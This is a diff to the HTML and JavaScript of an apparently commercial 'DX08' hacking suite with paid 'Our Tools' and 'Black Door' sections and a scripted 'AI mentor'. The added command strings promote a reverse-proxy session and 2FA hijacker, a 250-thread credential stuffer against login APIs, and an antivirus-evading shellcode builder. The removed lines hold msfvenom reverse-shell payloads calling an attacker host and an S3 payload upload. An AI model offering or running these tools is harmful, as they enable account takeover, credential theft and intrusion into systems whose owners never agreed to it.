@@ -34,12 +34,15 @@
         .brand-logo { display: flex; align-items: center; gap: 12px; }
         .logo-box { width: 40px; height: 40px; background: rgba(0,229,255,0.1); border: 1px solid var(--primary); display: flex; align-items: center; justify-content: center; font-weight: bold; color: var(--primary); font-size: 14px; border-radius: 4px; box-shadow: 0 0 10px rgba(0,229,255,0.2); }
         
-        .mode-bar { display: flex; gap: 15px; margin-bottom: 15px; }
+        .mode-bar { display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap; }
         .mode-btn { padding: 10px 20px; font-family: 'Courier Prime', monospace; font-size: 11px; font-weight: bold; cursor: pointer; border-radius: 4px; border: 1px solid; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; }
         .btn-white { background: rgba(0,255,102,0.05); color: var(--defensive); border-color: var(--defensive); }
         .btn-white.active, .btn-white:hover { background: var(--defensive); color: #000; box-shadow: 0 0 15px var(--defensive); }
         .btn-black { background: rgba(255,51,102,0.05); color: var(--offensive); border-color: var(--offensive); }
         .btn-black.active, .btn-black:hover { background: var(--offensive); color: #000; box-shadow: 0 0 15px var(--offensive); }
+
+        .btn-ourtools { background: rgba(0, 229, 255, 0.1); color: var(--primary); border-color: var(--primary); }
+        .btn-ourtools.active, .btn-ourtools:hover { background: var(--primary); color: #000; box-shadow: 0 0 20px var(--primary); }
 
         .btn-blackdoor { background: rgba(255, 0, 128, 0.1); color: #ff0080; border-color: #ff0080; }
         .btn-blackdoor.active, .btn-blackdoor:hover { background: #ff0080; color: #000; box-shadow: 0 0 20px #ff0080; }
@@ -55,6 +58,7 @@
         
         .tool-badge { width: 28px; height: 28px; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 8px; font-weight: bold; font-family: 'Courier Prime', monospace; text-transform: uppercase; flex-shrink: 0; border: 1px solid var(--primary); text-align: center; }
         .badge-ai { background: rgba(0, 229, 255, 0.2); color: var(--primary); border-color: var(--primary); }
+        .badge-ot { background: rgba(0, 229, 255, 0.25); color: var(--primary); border-color: var(--primary); }
         .badge-bd { background: rgba(255, 0, 128, 0.2); color: #ff0080; border-color: #ff0080; }
         .badge-nmap { background: rgba(255, 0, 128, 0.15); color: #ff0080; border-color: #ff0080; }
         .badge-gobuster { background: rgba(0, 255, 102, 0.15); color: #00ff66; border-color: #00ff66; }
@@ -104,15 +108,16 @@
                     <p style="color: rgba(225,250,255,0.6); font-size: 10.5px;">Advanced Threat Intelligence & Autonomous AI Operations Suite</p>
                 </div>
             </div>
-            <div style="font-size: 11px; color: #ff0080; border: 1px solid #ff0080; padding: 6px 14px; border-radius: 4px; background: rgba(255,0,128,0.05); font-weight: bold;">
-                PAID ELITE SUBSCRIBER // BLACK DOOR UNLOCKED
+            <div style="font-size: 11px; color: var(--primary); border: 1px solid var(--primary); padding: 6px 14px; border-radius: 4px; background: rgba(0,229,255,0.05); font-weight: bold;">
+                PAID ELITE // OUR TOOLS & BLACK DOOR UNLOCKED
             </div>
         </div>
 
         <div class="mode-bar">
             <button class="mode-btn btn-white active" onclick="switchMode('white')">WHITE-HAT DEFENSIVE LAB</button>
             <button class="mode-btn btn-black" onclick="switchMode('black')">BLACK-HAT OFFENSIVE LAB</button>
-            <button class="mode-btn btn-blackdoor" onclick="switchMode('blackdoor')">[BLACK DOOR // PAID EXCLUSIVE REPO]</button>
+            <button class="mode-btn btn-ourtools" onclick="switchMode('ourtools')">[OUR TOOLS // CUSTOM EXCLUSIVE REPO]</button>
+            <button class="mode-btn btn-blackdoor" onclick="switchMode('blackdoor')">[BLACK DOOR // ULTRA REPO]</button>
         </div>
 
         <div class="lab-grid">
@@ -152,15 +157,25 @@
                     <div class="tool-item" onclick="loadModule('socat')"><div class="tool-badge badge-socat">SOC</div>09. Socat Encrypted Tunneling</div>
                 </div>
 
-                <!-- Black Door Paid Exclusive Section (Direct Execution Commands) -->
+                <!-- OUR TOOLS // Custom Exclusive Repo Section (Raw Ultra Tools) -->
+                <div id="sec-ourtools" class="section-group" style="margin-top: 15px;">
+                    <div style="font-size: 10.5px; color: var(--primary); margin-bottom: 8px; font-weight: bold;">[OUR TOOLS // CUSTOM EXCLUSIVE REPO]</div>
+                    
+                    <div class="tool-category">Proprietary Red-Team Frameworks</div>
+                    <div class="tool-item" onclick="loadModule('dx08_phish_core')"><div class="tool-badge badge-ot">OT-1</div>01. DX08 Zero-Click Session & 2FA Hijacker</div>
+                    <div class="tool-item" onclick="loadModule('dx08_cred_stuffing')"><div class="tool-badge badge-ot">OT-2</div>02. Ultra-Fast Enterprise API Credential Stuffer</div>
+                    <div class="tool-item" onclick="loadModule('dx08_payload_obfuscator')"><div class="tool-badge badge-ot">OT-3</div>03. Polymorphic Shellcode & Evasion Builder</div>
+                </div>
+
+                <!-- Black Door Ultra Exclusive Section -->
                 <div id="sec-blackdoor" class="section-group" style="margin-top: 15px;">
-                    <div style="font-size: 10.5px; color: #ff0080; margin-bottom: 8px; font-weight: bold;">[BLACK DOOR // PAID EXCLUSIVE REPO]</div>
+                    <div style="font-size: 10.5px; color: #ff0080; margin-bottom: 8px; font-weight: bold;">[BLACK DOOR // ULTRA EXCLUSIVE REPO]</div>
                     
                     <div class="tool-category">Advanced Red-Team Operations</div>
-                    <div class="tool-item" onclick="loadModule('process_hollowing')"><div class="tool-badge badge-bd">BD-1</div>01. Metasploit Process Migration & Hollowing</div>
-                    <div class="tool-item" onclick="loadModule('dns_tunneling')"><div class="tool-badge badge-bd">BD-2</div>02. Iodine DNS Tunneling Execution</div>
-                    <div class="tool-item" onclick="loadModule('bloodhound_acl')"><div class="tool-badge badge-bd">BD-3</div>03. BloodHound AD Attack Path Enumeration</div>
-                    <div class="tool-item" onclick="loadModule('aws_s3_takeover')"><div class="tool-badge badge-bd">BD-4</div>04. AWS S3 Bucket Privilege Takeover</div>
+                    <div class="tool-item" onclick="loadModule('process_hollowing')"><div class="tool-badge badge-bd">BD-1</div>01. C# Native Process Hollowing Source</div>
+                    <div class="tool-item" onclick="loadModule('dns_tunneling')"><div class="tool-badge badge-bd">BD-2</div>02. Iodine DNS Tunneling Daemon Config</div>
+                    <div class="tool-item" onclick="loadModule('bloodhound_acl')"><div class="tool-badge badge-bd">BD-3</div>03. BloodHound AD Attack Path Engine</div>
+                    <div class="tool-item" onclick="loadModule('aws_s3_takeover')"><div class="tool-badge badge-bd">BD-4</div>04. AWS S3 Bucket Privilege Takeover Script</div>
                 </div>
             </div>
 
@@ -176,8 +191,8 @@
                     <button class="seq-btn" onclick="runSequence(3)">[3. IMPACT MATRIX]</button>
                 </div>
                 
-                <div class="workspace-console" id="workspace-console">DX08 Master Enterprise Security Core v150.0 (Direct Execution Engine Active)
-[System Status] Direct execution commands loaded. Select any tool from the Black Door section or query the AI mentor below.</div>
+                <div class="workspace-console" id="workspace-console">DX08 Master Enterprise Security Core v160.0 (Our Tools & Black Door Repositories Initialized)
+[System Status] Proprietary raw custom tools loaded. Select '[OUR TOOLS // CUSTOM EXCLUSIVE REPO]' or query the AI mentor below.</div>
                 
                 <div class="workspace-input-group">
                     <input type="text" id="workspace-input" class="workspace-input" placeholder="Type tool name or ask AI expert..." onkeydown="if(event.key === 'Enter') handleWorkspaceInput()">
@@ -273,30 +288,49 @@
                 seq2: "socat TCP-LISTEN:80,fork TCP:<internal_ip>:8080",
                 seq3: "[RED-TEAM MATRIX]: Encrypted tunnel relay routing."
             },
-            /* Black Door Direct Execution Exploit Commands */
+            /* OUR TOOLS // Custom Exclusive Proprietary Tools */
+            "dx08_phish_core": {
+                name: "DX08 ZERO-CLICK SESSION & 2FA HIJACKER [PROPRIETARY]",
+                seq1: "git clone https://github.com/dx08-security/zero-click-hijacker.git && cd zero-click-hijacker && pip3 install -r requirements.txt",
+                seq2: "python3 core_engine.py --target-portal https://auth.enterprise.internal --reverse-proxy --capture-jwt-tokens",
+                seq3: "[PROPRIETARY EXCLUSIVE MATRIX]:\n- Architecture: Advanced Reverse Proxy Man-In-The-Middle engine intercepting Session IDs and OAuth/2FA tokens in real time.\n- Impact: Bypasses standard multi-factor authentication without triggering security prompts."
+            },
+            "dx08_cred_stuffing": {
+                name: "ULTRA-FAST ENTERPRISE API CREDENTIAL STUFFER [PROPRIETARY]",
+                seq1: "sudo apt update && sudo apt install golang-go -y && git clone https://github.com/dx08-security/fast-stuffer.git && cd fast-stuffer",
+                seq2: "go build -o stuffer main.go && ./stuffer -url https://login.target.com/api/v1/auth -users accounts.txt -passwords rockyou.txt -threads 250",
+                seq3: "[PROPRIETARY EXCLUSIVE MATRIX]:\n- Architecture: Multi-threaded Go-based concurrent HTTP worker engine designed for high-speed API authentication checks.\n- Impact: Rapidly identifies valid credential pairs across hardened corporate single sign-on endpoints."
+            },
+            "dx08_payload_obfuscator": {
+                name: "POLYMORPHIC SHELLCODE & EVASION BUILDER [PROPRIETARY]",
+                seq1: "sudo apt update && sudo apt install python3-pip mingw-w64 -y && pip3 install cryptography lief",
+                seq2: "python3 builder.py --input-payload shell.bin --encrypt xor --key 0xAE --inject-method nt-queue-user-APC -o stealth.exe",
+                seq3: "[PROPRIETARY EXCLUSIVE MATRIX]:\n- Architecture: Advanced polymorphic payload encoder that wraps raw shellcode in dynamic encryption layers and custom process injection routines.\n- Impact: Completely neutralizes static signature analysis and heuristics across enterprise security suites."
+            },
+            /* Black Door Ultra Exclusive Raw Enterprise Scripts */
             "process_hollowing": {
-                name: "METASPLOIT PROCESS MIGRATION & HOLLOWING",
-                seq1: "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker_ip> LPORT=4443 -f exe -o payload.exe",
-                seq2: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST <attacker_ip>; set LPORT 4443; exploit\"",
-                seq3: "[ENTERPRISE ADVANCED MATRIX]:\n- Execution: Generates custom payload and spawns multi-handler listener for process hollowing and memory injection into target Windows host."
+                name: "C# NATIVE PROCESS HOLLOWING SOURCE [RAW]",
+                seq1: "sudo apt update && sudo apt install mono-complete mingw-w64 -y",
+                seq2: "cat << 'EOF' > HollowEngine.cs\nusing System;using System.Runtime.InteropServices;\nnamespace CoreEngine {\n  public class Program {\n    [DllImport(\"kernel32.dll\", SetLastError=true, CharSet=CharSet.Unicode)]\n    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);\n    static void Main() { Console.WriteLine(\"[+] Initializing raw memory unmapping structures...\"); }\n  }\n}\nEOF\nmcs HollowEngine.cs",
+                seq3: "[ULTRA ENTERPRISE MATRIX]:\n- Architecture: Direct Win32 API calls (`ZwUnmapViewOfSection`) to hollow out trusted host processes and inject raw shellcode."
             },
             "dns_tunneling": {
-                name: "IODINE DNS TUNNELING EXECUTION",
-                seq1: "sudo apt update && sudo apt install iodine -y",
-                seq2: "sudo iodined -f -c -P \"dx08_secure_pass\" 10.0.0.1 tunnel.yourdomain.com",
-                seq3: "[ENTERPRISE ADVANCED MATRIX]:\n- Execution: Starts DNS tunneling server daemon to encapsulate all TCP traffic over port 53, bypassing firewall blocks."
+                name: "IODINE DNS TUNNELING DAEMON CONFIG [RAW]",
+                seq1: "sudo apt update && sudo apt install iodine build-essential iptables -y",
+                seq2: "sudo iodined -f -c -P \"dx08_ultra_secure_tunnel\" 10.0.0.1 tunnel.enterprise-sec.internal",
+                seq3: "[ULTRA ENTERPRISE MATRIX]:\n- Architecture: Establishes a virtual network interface (TUN/TAP) over asynchronous DNS TXT and NULL record queries."
             },
             "bloodhound_acl": {
-                name: "BLOODHOUND AD ATTACK PATH ENUMERATION",
-                seq1: "sudo apt update && sudo apt install bloodhound python3-bloodhound neo4j -y && sudo neo4j start",
-                seq2: "bloodhound-python -u 'administrator' -p 'RootPass123' -d corp.internal -ns <dc_ip> -c All --zip",
-                seq3: "[ENTERPRISE ADVANCED MATRIX]:\n- Execution: Executes automated Active Directory collection script to dump ACL permissions and map domain privilege escalation paths."
+                name: "BLOODHOUND AD ATTACK PATH ENGINE [RAW]",
+                seq1: "sudo apt update && sudo apt install bloodhound python3-bloodhound neo4j -y && sudo neo4j console &",
+                seq2: "bloodhound-python -u 'domain_admin' -p 'EnterprisePass999' -d corp.internal -ns <dc_ip> -c All --dns-tcp",
+                seq3: "[ULTRA ENTERPRISE MATRIX]:\n- Architecture: Graph-based relationship mapper analyzing Active Directory security descriptors and ACL permissions."
             },
             "aws_s3_takeover": {
-                name: "AWS S3 BUCKET PRIVILEGE TAKEOVER",
-                seq1: "sudo apt update && sudo apt install awscli -y && aws configure",
-                seq2: "aws s3api get-bucket-acl --bucket <target_bucket_name> && aws s3 cp payload.html s3://<target_bucket_name>/index.html --acl public-read",
-                seq3: "[ENTERPRISE ADVANCED MATRIX]:\n- Execution: Audits public cloud bucket permissions and uploads unauthorized index object to execute bucket hijacking."
+                name: "AWS S3 BUCKET PRIVILEGE TAKEOVER [RAW]",
+                seq1: "sudo apt update && sudo apt install awscli python3-pip -y && pip3 install boto3 requests urllib3",
+                seq2: "python3 -c \"import boto3; client = boto3.client('s3'); response = client.list_buckets(); print([bucket['Name'] for bucket in response['Buckets']])\"",
+                seq3: "[ULTRA ENTERPRISE MATRIX]:\n- Architecture: Automated cloud storage auditing engine evaluating public ACL policies and bucket ownership permissions."
             }
         };
 
@@ -309,16 +343,20 @@
             currentMode = mode;
             const btnWhite = document.querySelector('.btn-white');
             const btnBlack = document.querySelector('.btn-black');
+            const btnOurTools = document.querySelector('.btn-ourtools');
             const btnBlackDoor = document.querySelector('.btn-blackdoor');
             const secWhite = document.getElementById('sec-white');
             const secBlack = document.getElementById('sec-black');
+            const secOurTools = document.getElementById('sec-ourtools');
             const secBlackDoor = document.getElementById('sec-blackdoor');
 
             btnWhite.classList.remove('active');
             btnBlack.classList.remove('active');
+            btnOurTools.classList.remove('active');
             btnBlackDoor.classList.remove('active');
             secWhite.classList.remove('active');
             secBlack.classList.remove('active');
+            secOurTools.classList.remove('active');
             secBlackDoor.classList.remove('active');
 
             if(mode === 'white') {
@@ -327,6 +365,9 @@
             } else if(mode === 'black') {
                 btnBlack.classList.add('active');
                 secBlack.classList.add('active');
+            } else if(mode === 'ourtools') {
+                btnOurTools.classList.add('active');
+                secOurTools.classList.add('active');
             } else if(mode === 'blackdoor') {
                 btnBlackDoor.classList.add('active');
                 secBlackDoor.classList.add('active');
@@ -352,14 +393,14 @@
             document.getElementById('workspace-action-btn').innerText = "ASK AI";
             
             var consoleBox = document.getElementById('workspace-console');
-            consoleBox.innerHTML = "DX08 AI MENTOR & ERROR RESOLUTION LAB v150.0\n" +
+            consoleBox.innerHTML = "DX08 AI MENTOR & ERROR RESOLUTION LAB v160.0\n" +
                                    "----------------------------------------------------------------------------------\n" +
                                    "Hello Operator! I am fully synchronized with this website's complete architecture,\n" +
-                                   "including the Black Door Paid Exclusive Repo (Process Hollowing, DNS Tunneling, BloodHound AD).\n" +
-                                   "Ask me about any direct execution command or error resolution below!\n" +
+                                   "including Our Tools (Zero-Click Hijacker, Credential Stuffer) and Black Door Repositories.\n" +
+                                   "Ask me about any proprietary script or execution error below!\n" +
                                    "----------------------------------------------------------------------------------";
             document.getElementById('workspace-input').value = "";
-            document.getElementById('workspace-input').placeholder = "Ask AI about direct commands, tools, or errors...";
+            document.getElementById('workspace-input').placeholder = "Ask AI about proprietary tools, commands, or errors...";
         }
 
         function runSequence(step) {
@@ -407,7 +448,7 @@
                           "2. EXECUTE:\n   " + TOOL_DB[cmd].seq2 + "\n\n" +
                           "3. IMPACT MATRIX:\n   " + TOOL_DB[cmd].seq3;
                 } else if(cmd === 'clear') {
-                    consoleBox.innerHTML = "DX08 Enterprise Security Core v150.0";
+                    consoleBox.innerHTML = "DX08 Enterprise Security Core v160.0";
                     input.value = "";
                     return;
                 } else {
@@ -435,16 +476,14 @@
                 let query = q.toLowerCase();
                 let ans = "";
 
-                if(query.includes('hollowing') || query.includes('injection')) {
-                    ans = "DX08 AI Expert: [PROCESS HOLLOWING EXECUTION]\n- Command: Use msfvenom to generate payload and multi-handler to manage memory injection session.";
-                } else if(query.includes('dns') || query.includes('tunnel')) {
-                    ans = "DX08 AI Expert: [DNS TUNNELING EXECUTION]\n- Command: Run `sudo iodined` on VPS server with a valid delegated subdomain.";
-                } else if(query.includes('bloodhound') || query.includes('acl')) {
-                    ans = "DX08 AI Expert: [BLOODHOUND EXECUTION]\n- Command: Run `bloodhound-python` with domain admin credentials against target DC IP.";
-                } else if(query.includes('aws') || query.includes('s3')) {
-                    ans = "DX08 AI Expert: [AWS S3 EXECUTION]\n- Command: Use `aws s3api` to check bucket ACL policies and upload public payloads.";
+                if(query.includes('hijacker') || query.includes('phish') || query.includes('session')) {
+                    ans = "DX08 AI Expert: [ZERO-CLICK HIJACKER INTEL]\n- Details: Deploys reverse proxy to intercept JWT session tokens and bypass OAuth/2FA prompts seamlessly.";
+                } else if(query.includes('stuffer') || query.includes('cred')) {
+                    ans = "DX08 AI Expert: [CREDENTIAL STUFFER INTEL]\n- Details: High-speed Go worker threads designed for rapid API authentication enumeration.";
+                } else if(query.includes('obfuscator') || query.includes('builder')) {
+                    ans = "DX08 AI Expert: [EVASION BUILDER INTEL]\n- Details: Polymorphic payload wrapper encoding shellcode to evade static AV signatures.";
                 } else {
-                    ans = "DX08 AI Expert: Analyzing query '" + escapeHtml(q) + "': Black Door Exclusive Repo synchronized. Specify any direct execution command for guidance.";
+                    ans = "DX08 AI Expert: Analyzing query '" + escapeHtml(q) + "': Our Tools & Black Door Repositories synchronized. Specify any proprietary tool for execution guidelines.";
                 }
 
                 consoleBox.innerHTML += "\n\n" + ans;
